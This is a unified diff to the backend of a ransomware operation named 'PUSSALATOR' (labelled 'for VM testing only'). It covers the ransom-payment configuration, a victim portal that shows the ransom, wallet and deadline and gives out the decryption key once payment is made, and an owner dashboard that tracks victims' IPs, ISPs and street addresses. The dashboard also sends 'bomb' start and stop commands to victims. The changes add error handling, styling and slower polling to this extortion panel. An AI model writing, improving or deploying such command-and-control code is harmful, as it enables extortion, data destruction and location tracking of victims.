@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSSALATOR - Complete Backend with Separate Pages
+PUSSALATOR - Complete Backend with Stable Display
 FOR VM TESTING ONLY
 """
 
@@ -46,7 +46,7 @@ class Config:
     ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
     BTC_WALLET = os.environ.get('BTC_WALLET')
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL',)
+    SERVER_URL = os.environ.get('SERVER_URL')
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
@@ -386,7 +386,7 @@ app.add_middleware(
 )
 
 # ============================================================================
-# HTML TEMPLATES - Separate Pages
+# HTML TEMPLATES - Separate Pages with Stable Display
 # ============================================================================
 
 INDEX_HTML = """
@@ -447,6 +447,7 @@ INDEX_HTML = """
             cursor: pointer;
             margin: 10px;
             width: 250px;
+            transition: 0.3s;
         }
         
         .button:hover {
@@ -476,6 +477,7 @@ INDEX_HTML = """
             color: #ff6666;
             margin-top: 30px;
             font-size: 14px;
+            min-height: 30px;
         }
     </style>
 </head>
@@ -499,9 +501,7 @@ INDEX_HTML = """
             <button class="button">👑 OWNER LOGIN</button>
         </a>
         
-        <div class="stats" id="stats">
-            Loading stats...
-        </div>
+        <div class="stats" id="stats">Loading stats...</div>
     </div>
 
     <script>
@@ -511,11 +511,13 @@ INDEX_HTML = """
                 const s = await r.json();
                 document.getElementById('stats').innerHTML = 
                     `Victims: ${s.total} | Paid: ${s.paid} | BTC: ${s.btc} | Bombs: ${s.bombs}`;
-            } catch(e) {}
+            } catch(e) {
+                document.getElementById('stats').innerHTML = 'Stats temporarily unavailable';
+            }
         }
         
         loadStats();
-        setInterval(loadStats, 5000);
+        setInterval(loadStats, 10000); // Update every 10 seconds instead of 5
     </script>
 </body>
 </html>
@@ -577,6 +579,7 @@ VICTIM_HTML = """
             color: #00ff00;
             font-family: 'Courier New', monospace;
             font-size: 16px;
+            box-sizing: border-box;
         }
         
         button {
@@ -589,6 +592,7 @@ VICTIM_HTML = """
             font-size: 16px;
             cursor: pointer;
             width: 100%;
+            transition: 0.3s;
         }
         
         button:hover {
@@ -600,6 +604,7 @@ VICTIM_HTML = """
             padding: 20px;
             background: #1a1a1a;
             border: 1px solid #00ff00;
+            min-height: 100px;
         }
         
         .back {
@@ -614,6 +619,15 @@ VICTIM_HTML = """
         
         .back a:hover {
             color: #00ff00;
+        }
+        
+        .key-box {
+            background: black;
+            padding: 15px;
+            word-break: break-all;
+            font-family: monospace;
+            border: 1px solid #00ff00;
+            margin: 10px 0;
         }
     </style>
 </head>
@@ -647,37 +661,42 @@ VICTIM_HTML = """
                 return;
             }
             
-            const r = await fetch(`/api/victim/${id}`);
             const result = document.getElementById('result');
+            result.style.display = 'block';
+            result.innerHTML = 'Loading...';
             
-            if (r.status === 200) {
-                const v = await r.json();
-                const deadline = new Date(v.deadline).toLocaleString();
+            try {
+                const r = await fetch(`/api/victim/${id}`);
                 
-                if (v.status === 'paid') {
-                    result.innerHTML = `
-                        <h3 style="color: #00ff00;">✅ PAYMENT VERIFIED</h3>
-                        <p><strong>Client ID:</strong> ${v.id}</p>
-                        <p><strong>Decryption Key:</strong></p>
-                        <p style="background: black; padding: 10px; word-break: break-all;">${v.key}</p>
-                        <p style="color: #ffff00;">Use this key with the recovery tool.</p>
-                    `;
+                if (r.status === 200) {
+                    const v = await r.json();
+                    const deadline = new Date(v.deadline).toLocaleString();
+                    
+                    if (v.status === 'paid') {
+                        result.innerHTML = `
+                            <h3 style="color: #00ff00;">✅ PAYMENT VERIFIED</h3>
+                            <p><strong>Client ID:</strong> ${v.id}</p>
+                            <p><strong>Decryption Key:</strong></p>
+                            <div class="key-box">${v.key}</div>
+                            <p style="color: #ffff00;">Use this key with the recovery tool.</p>
+                        `;
+                    } else {
+                        result.innerHTML = `
+                            <h3 style="color: #ff0000;">⏳ PAYMENT PENDING</h3>
+                            <p><strong>Client ID:</strong> ${v.id}</p>
+                            <p><strong>Files Encrypted:</strong> ${v.files}</p>
+                            <p><strong>Ransom:</strong> ${v.ransom}</p>
+                            <p><strong>Wallet:</strong> ${v.wallet}</p>
+                            <p><strong>Deadline:</strong> ${deadline}</p>
+                            <p><strong>Bomb Status:</strong> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}</p>
+                            <p style="color: #ffff00;">Send payment to the wallet address above.</p>
+                        `;
+                    }
                 } else {
-                    result.innerHTML = `
-                        <h3 style="color: #ff0000;">⏳ PAYMENT PENDING</h3>
-                        <p><strong>Client ID:</strong> ${v.id}</p>
-                        <p><strong>Files Encrypted:</strong> ${v.files}</p>
-                        <p><strong>Ransom:</strong> ${v.ransom}</p>
-                        <p><strong>Wallet:</strong> ${v.wallet}</p>
-                        <p><strong>Deadline:</strong> ${deadline}</p>
-                        <p><strong>Bomb Status:</strong> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}</p>
-                        <p style="color: #ffff00;">Send payment to the wallet address above.</p>
-                    `;
+                    result.innerHTML = '<h3 style="color: #ff0000;">❌ Client ID not found</h3>';
                 }
-                result.style.display = 'block';
-            } else {
-                result.innerHTML = '<h3 style="color: #ff0000;">❌ Client ID not found</h3>';
-                result.style.display = 'block';
+            } catch(e) {
+                result.innerHTML = '<h3 style="color: #ff0000;">❌ Error connecting to server</h3>';
             }
         }
     </script>
@@ -727,6 +746,7 @@ OWNER_LOGIN_HTML = """
             color: #ff0000;
             font-family: 'Courier New', monospace;
             font-size: 16px;
+            box-sizing: border-box;
         }
         
         button {
@@ -739,6 +759,7 @@ OWNER_LOGIN_HTML = """
             font-size: 16px;
             cursor: pointer;
             width: 100%;
+            transition: 0.3s;
         }
         
         button:hover {
@@ -748,6 +769,7 @@ OWNER_LOGIN_HTML = """
         .error {
             color: #ff6666;
             margin: 10px 0;
+            min-height: 20px;
         }
         
         .back {
@@ -784,18 +806,22 @@ OWNER_LOGIN_HTML = """
         
         async function login() {
             const pwd = document.getElementById('password').value;
-            const r = await fetch('/api/owner/login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({password: pwd})
-            });
-            const d = await r.json();
-            
-            if (d.success) {
-                window.location.href = '/owner/dashboard';
-            } else {
-                document.getElementById('error').innerHTML = '❌ Invalid password';
-                document.getElementById('password').value = '';
+            try {
+                const r = await fetch('/api/owner/login', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({password: pwd})
+                });
+                const d = await r.json();
+                
+                if (d.success) {
+                    window.location.href = '/owner/dashboard';
+                } else {
+                    document.getElementById('error').innerHTML = '❌ Invalid password';
+                    document.getElementById('password').value = '';
+                }
+            } catch(e) {
+                document.getElementById('error').innerHTML = '❌ Connection error';
             }
         }
     </script>
@@ -850,6 +876,7 @@ OWNER_DASHBOARD_HTML = """
             padding: 20px;
             text-align: center;
             background: #1a0000;
+            min-height: 80px;
         }
         
         .stat-value {
@@ -892,6 +919,7 @@ OWNER_DASHBOARD_HTML = """
             font-family: 'Courier New', monospace;
             flex: 1;
             min-width: 200px;
+            box-sizing: border-box;
         }
         
         button {
@@ -902,6 +930,7 @@ OWNER_DASHBOARD_HTML = """
             font-family: 'Courier New', monospace;
             font-weight: bold;
             cursor: pointer;
+            transition: 0.3s;
         }
         
         button:hover {
@@ -921,6 +950,7 @@ OWNER_DASHBOARD_HTML = """
         
         .table-container {
             overflow-x: auto;
+            min-height: 200px;
         }
         
         table {
@@ -932,6 +962,8 @@ OWNER_DASHBOARD_HTML = """
             background: #ff0000;
             color: black;
             padding: 10px;
+            position: sticky;
+            top: 0;
         }
         
         td {
@@ -967,7 +999,7 @@ OWNER_DASHBOARD_HTML = """
         }
         
         .logs {
-            height: 150px;
+            height: 200px;
             overflow-y: auto;
             background: black;
             border: 1px solid #ff0000;
@@ -1001,6 +1033,8 @@ OWNER_DASHBOARD_HTML = """
             cursor: pointer;
             border: 1px solid #ff0000;
             border-bottom: none;
+            flex: 1;
+            text-align: center;
         }
         
         .tab.active {
@@ -1015,6 +1049,14 @@ OWNER_DASHBOARD_HTML = """
         
         .tab-content.active {
             display: block;
+        }
+        
+        .victim-info {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #ff0000;
+            min-height: 100px;
         }
     </style>
 </head>
@@ -1050,23 +1092,28 @@ OWNER_DASHBOARD_HTML = """
                     <button onclick="getVictim()">GET VICTIM</button>
                     <button class="danger" onclick="deleteVictim()">DELETE</button>
                 </div>
-                <div id="victim_info" style="margin-bottom: 20px; padding: 10px; background: #1a1a1a;"></div>
+                <div id="victim_info" class="victim-info">Enter a Victim ID to view details</div>
             </div>
             
             <div class="panel">
                 <h3>📊 ALL VICTIMS</h3>
                 <div class="table-container">
                     <table id="victims_table">
-                        <tr>
-                            <th>ID</th>
-                            <th>FILES</th>
-                            <th>LOCATION</th>
-                            <th>IP</th>
-                            <th>STATUS</th>
-                            <th>BOMB</th>
-                            <th>DEADLINE</th>
-                            <th>ACTIONS</th>
-                        </tr>
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>FILES</th>
+                                <th>LOCATION</th>
+                                <th>IP</th>
+                                <th>STATUS</th>
+                                <th>BOMB</th>
+                                <th>DEADLINE</th>
+                                <th>ACTIONS</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td colspan="8">Loading victims...</td></tr>
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -1094,13 +1141,18 @@ OWNER_DASHBOARD_HTML = """
                 <h3>💣 ACTIVE BOMBS</h3>
                 <div class="table-container">
                     <table id="bombs_table">
-                        <tr>
-                            <th>CLIENT ID</th>
-                            <th>SIZE</th>
-                            <th>STATUS</th>
-                            <th>STARTED</th>
-                            <th>ACTION</th>
-                        </tr>
+                        <thead>
+                            <tr>
+                                <th>CLIENT ID</th>
+                                <th>SIZE</th>
+                                <th>STATUS</th>
+                                <th>LAST SEEN</th>
+                                <th>ACTION</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td colspan="5">No active bombs</td></tr>
+                        </tbody>
                     </table>
                 </div>
             </div>
@@ -1109,13 +1161,14 @@ OWNER_DASHBOARD_HTML = """
         <div id="logs-tab" class="tab-content">
             <div class="panel">
                 <h3>📝 SYSTEM LOGS</h3>
-                <div class="logs" id="logs"></div>
+                <div class="logs" id="logs">Loading logs...</div>
             </div>
         </div>
     </div>
 
     <script>
         let currentTab = 'victims';
+        let updateInterval;
         
         function showTab(tab) {
             currentTab = tab;
@@ -1143,7 +1196,7 @@ OWNER_DASHBOARD_HTML = """
             try {
                 const r = await fetch('/api/victims');
                 const v = await r.json();
-                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>BOMB</th><th>DEADLINE</th><th>ACTIONS</th></tr>';
+                let html = '';
                 for (const [id, data] of Object.entries(v)) {
                     const deadline = new Date(data.deadline).toLocaleString();
                     const bombStatus = data.bomb_status === 'active' ? 
@@ -1160,7 +1213,7 @@ OWNER_DASHBOARD_HTML = """
                         <td><button class="danger" onclick="quickDelete('${id}')">X</button></td>
                     </tr>`;
                 }
-                document.getElementById('victims_table').innerHTML = html;
+                document.querySelector('#victims_table tbody').innerHTML = html || '<tr><td colspan="8">No victims found</td></tr>';
             } catch(e) {}
         }
         
@@ -1168,7 +1221,7 @@ OWNER_DASHBOARD_HTML = """
             try {
                 const r = await fetch('/api/victims');
                 const v = await r.json();
-                let html = '<tr><th>CLIENT ID</th><th>SIZE</th><th>STATUS</th><th>STARTED</th><th>ACTION</th></tr>';
+                let html = '';
                 for (const [id, data] of Object.entries(v)) {
                     if (data.bomb_status === 'active') {
                         html += `<tr>
@@ -1180,7 +1233,7 @@ OWNER_DASHBOARD_HTML = """
                         </tr>`;
                     }
                 }
-                document.getElementById('bombs_table').innerHTML = html;
+                document.querySelector('#bombs_table tbody').innerHTML = html || '<tr><td colspan="5">No active bombs</td></tr>';
             } catch(e) {}
         }
         
@@ -1192,7 +1245,7 @@ OWNER_DASHBOARD_HTML = """
                 l.slice(-50).forEach(log => {
                     html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
                 });
-                document.getElementById('logs').innerHTML = html;
+                document.getElementById('logs').innerHTML = html || 'No logs';
             } catch(e) {}
         }
         
@@ -1201,15 +1254,19 @@ OWNER_DASHBOARD_HTML = """
             const file = document.getElementById('bomb_file').value;
             if (!client) return alert('Enter Client ID');
             
-            const r = await fetch('/api/bomb/start', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({client_id: client, filename: file})
-            });
-            const d = await r.json();
-            if (d.success) {
-                alert('Bomb command sent');
-                setTimeout(checkBomb, 2000);
+            try {
+                const r = await fetch('/api/bomb/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({client_id: client, filename: file})
+                });
+                const d = await r.json();
+                if (d.success) {
+                    alert('Bomb command sent');
+                    setTimeout(checkBomb, 2000);
+                }
+            } catch(e) {
+                alert('Error sending command');
             }
         }
         
@@ -1217,16 +1274,20 @@ OWNER_DASHBOARD_HTML = """
             const client = document.getElementById('bomb_client').value;
             if (!client) return alert('Enter Client ID');
             
-            const r = await fetch('/api/bomb/stop', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({client_id: client})
-            });
-            const d = await r.json();
-            if (d.success) {
-                alert('Stop command sent');
-                document.getElementById('bomb_progress').style.display = 'none';
-                document.getElementById('bomb_status').innerHTML = '';
+            try {
+                const r = await fetch('/api/bomb/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({client_id: client})
+                });
+                const d = await r.json();
+                if (d.success) {
+                    alert('Stop command sent');
+                    document.getElementById('bomb_progress').style.display = 'none';
+                    document.getElementById('bomb_status').innerHTML = '';
+                }
+            } catch(e) {
+                alert('Error sending command');
             }
         }
         
@@ -1234,51 +1295,61 @@ OWNER_DASHBOARD_HTML = """
             const client = document.getElementById('bomb_client').value;
             if (!client) return;
             
-            const r = await fetch(`/api/victim/${client}`);
-            if (r.status === 200) {
-                const v = await r.json();
-                if (v.bomb_status === 'active') {
-                    document.getElementById('bomb_status').innerHTML = 
-                        `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
-                    document.getElementById('bomb_progress').style.display = 'block';
-                    document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
-                } else {
-                    document.getElementById('bomb_status').innerHTML = 'No active bomb';
-                    document.getElementById('bomb_progress').style.display = 'none';
+            try {
+                const r = await fetch(`/api/victim/${client}`);
+                if (r.status === 200) {
+                    const v = await r.json();
+                    if (v.bomb_status === 'active') {
+                        document.getElementById('bomb_status').innerHTML = 
+                            `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
+                        document.getElementById('bomb_progress').style.display = 'block';
+                        document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
+                    } else {
+                        document.getElementById('bomb_status').innerHTML = 'No active bomb';
+                        document.getElementById('bomb_progress').style.display = 'none';
+                    }
                 }
-            }
+            } catch(e) {}
         }
         
         async function quickStop(clientId) {
-            const r = await fetch('/api/bomb/stop', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({client_id: clientId})
-            });
-            if (r.ok) {
-                loadBombs();
-                loadVictims();
-            }
+            try {
+                const r = await fetch('/api/bomb/stop', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({client_id: clientId})
+                });
+                if (r.ok) {
+                    loadBombs();
+                    loadVictims();
+                }
+            } catch(e) {}
         }
         
         async function getVictim() {
             const id = document.getElementById('victim_id').value;
-            const r = await fetch(`/api/victim/${id}`);
-            if (r.status === 200) {
-                const v = await r.json();
-                document.getElementById('victim_info').innerHTML = `
-                    <b>ID:</b> ${v.id}<br>
-                    <b>Files:</b> ${v.files}<br>
-                    <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
-                    <b>IP:</b> ${v.ip}<br>
-                    <b>ISP:</b> ${v.isp}<br>
-                    <b>Status:</b> <span class="${v.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${v.status}</span><br>
-                    <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
-                    <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
-                    ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
-                `;
-            } else {
-                document.getElementById('victim_info').innerHTML = 'Victim not found';
+            if (!id) return;
+            
+            try {
+                const r = await fetch(`/api/victim/${id}`);
+                if (r.status === 200) {
+                    const v = await r.json();
+                    document.getElementById('victim_info').innerHTML = `
+                        <b>ID:</b> ${v.id}<br>
+                        <b>Files:</b> ${v.files}<br>
+                        <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
+                        <b>IP:</b> ${v.ip}<br>
+                        <b>ISP:</b> ${v.isp}<br>
+                        <b>Status:</b> <span class="${v.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${v.status}</span><br>
+                        <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
+                        <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
+                        ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
+                    `;
+                } else {
+                    document.getElementById('victim_info').innerHTML = 'Victim not found';
+                }
+            } catch(e) {
+                document.getElementById('victim_info').innerHTML = 'Error loading victim';
             }
         }
         
@@ -1286,22 +1357,26 @@ OWNER_DASHBOARD_HTML = """
             const id = document.getElementById('victim_id').value;
             if (!id) return;
             if (confirm('Delete ' + id + '?')) {
-                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
-                loadVictims();
-                loadBombs();
-                document.getElementById('victim_info').innerHTML = '';
+                try {
+                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
+                    loadVictims();
+                    loadBombs();
+                    document.getElementById('victim_info').innerHTML = 'Victim deleted';
+                } catch(e) {}
             }
         }
         
         async function quickDelete(id) {
             if (confirm('Delete ' + id + '?')) {
-                await fetch(`/api/victim/${id}`, {method: 'DELETE'});
-                loadVictims();
-                loadBombs();
+                try {
+                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
+                    loadVictims();
+                    loadBombs();
+                } catch(e) {}
             }
         }
         
-        async function logout() {
+        function logout() {
             window.location.href = '/';
         }
         
@@ -1309,19 +1384,25 @@ OWNER_DASHBOARD_HTML = """
             document.getElementById('timestamp').innerText = new Date().toLocaleString();
         }
         
-        setInterval(() => {
+        // Start periodic updates (every 10 seconds instead of 3)
+        function startUpdates() {
             loadStats();
             loadVictims();
             loadBombs();
             loadLogs();
             updateTime();
-        }, 3000);
+            
+            if (updateInterval) clearInterval(updateInterval);
+            updateInterval = setInterval(() => {
+                loadStats();
+                loadVictims();
+                loadBombs();
+                loadLogs();
+                updateTime();
+            }, 10000);
+        }
         
-        loadStats();
-        loadVictims();
-        loadBombs();
-        loadLogs();
-        updateTime();
+        startUpdates();
     </script>
 </body>
 </html>
